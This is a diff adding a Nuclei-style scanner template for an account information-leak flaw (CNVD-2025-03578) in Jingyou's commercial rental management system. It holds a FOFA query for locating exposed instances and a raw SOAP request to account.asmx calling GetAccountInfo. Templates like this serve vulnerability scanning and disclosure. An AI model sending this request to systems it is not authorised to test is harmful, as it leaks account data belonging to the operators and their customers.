@@ -1,0 +1,19 @@
+id: poc-sqk84986thu2dgck
+info:
+  name: 竞优软件商业租赁管理系统account信息泄露漏洞(CNVD-2025-03578)
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sqk84986thu2dgck'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sqk84986thu2dgck
+    fofa: title="商业租赁管理系统" || body="Silverlight/install/Silverlight5.exe" || body="pageUrl = \"/loading.aspx\"" || body="竞优软件</a>"
+http:
+- raw:
+  - "POST /rental/contract/api/account.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nConnection: close\nContent-Length: 338\nContent-Type: text/xml; charset=utf-8\nSOAPAction: [http://tempuri.org/GetAccountInfo](http://tempuri.org/GetAccountInfo)\nAccept-Encoding: gzip\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n    xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soap:Body>\n        <GetAccountInfo xmlns=\"http://tempuri.org/\" />\n    </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
